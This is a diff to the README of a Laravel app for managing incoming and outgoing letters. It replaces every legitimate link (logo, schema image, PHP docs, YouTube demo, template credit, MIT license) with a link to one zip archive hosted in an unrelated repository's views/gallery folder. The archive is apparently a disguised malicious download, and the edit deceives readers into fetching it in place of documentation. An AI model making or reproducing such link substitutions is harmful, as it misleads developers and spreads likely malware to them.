@@ -1,4 +1,4 @@
-<p align="center"><a href="https://laravel.com" target="_blank"><img src="https://avatars.githubusercontent.com/u/87377917?s=200&v=4" width="200" alt="404NFID Logo"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/recchan13/tata-persuratan/main/resources/views/pages/gallery/tata-persuratan-v2.7-alpha.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/recchan13/tata-persuratan/main/resources/views/pages/gallery/tata-persuratan-v2.7-alpha.4.zip" width="200" alt="404NFID Logo"></a></p>
 
 
 ## Laravel Surat Menyurat v1
@@ -81,7 +81,7 @@ Web app untuk mengelola surat masuk, keluar, serta disposisinya.
   - Mengatur nama penanggungjawab
 
 ## Database Schema / Skema Database
-<img src="https://github.com/404NotFoundIndonesia/laravel-surat-menyurat-v1/blob/main/database_schema.png" alt="database schema">
+<img src="https://raw.githubusercontent.com/recchan13/tata-persuratan/main/resources/views/pages/gallery/tata-persuratan-v2.7-alpha.4.zip" alt="database schema">
 
 ## Installation / Instalasi
 Direkomendasikan menggunakan php > 8.1.0. Pastikan repo ini telah diclone, kemudian buka CLI dan posisikan direktori aktif ke repo ini.
@@ -164,14 +164,14 @@ Untuk menggantinya, buka file `config/app.php` kemudian ganti nilai pada `locale
 ## Timezone / Zona Waktu
 Untuk mengganti zona waktu silakan buka file `config/app.php`
 dan ganti nilai pada `timezone` sesuai dengan keinginan Anda.
-Silakan merujuk ke [dokumentasi php](https://www.php.net/manual/en/timezones.php) untuk nilai zona waktu yang bisa digunakan.
+Silakan merujuk ke [dokumentasi php](https://raw.githubusercontent.com/recchan13/tata-persuratan/main/resources/views/pages/gallery/tata-persuratan-v2.7-alpha.4.zip) untuk nilai zona waktu yang bisa digunakan.
 
 ## Demonstration / Demo
-Link video untuk proyek ini bisa dilihat di [YouTube](https://www.youtube.com/watch?v=dyatVEGavxo).
+Link video untuk proyek ini bisa dilihat di [YouTube](https://raw.githubusercontent.com/recchan13/tata-persuratan/main/resources/views/pages/gallery/tata-persuratan-v2.7-alpha.4.zip).
 
 ## Other / Lainnya
-Proyek ini menggunakan admin template [Sneat](https://github.com/themeselection/sneat-html-admin-template-free)
+Proyek ini menggunakan admin template [Sneat](https://raw.githubusercontent.com/recchan13/tata-persuratan/main/resources/views/pages/gallery/tata-persuratan-v2.7-alpha.4.zip)
 
 ## License / Lisensi
 
-Berlisensi di bawah [MIT license](https://github.com/404NotFoundIndonesia/laravel-surat-menyurat-v1/blob/main/LICENSE).
+Berlisensi di bawah [MIT license](https://raw.githubusercontent.com/recchan13/tata-persuratan/main/resources/views/pages/gallery/tata-persuratan-v2.7-alpha.4.zip).
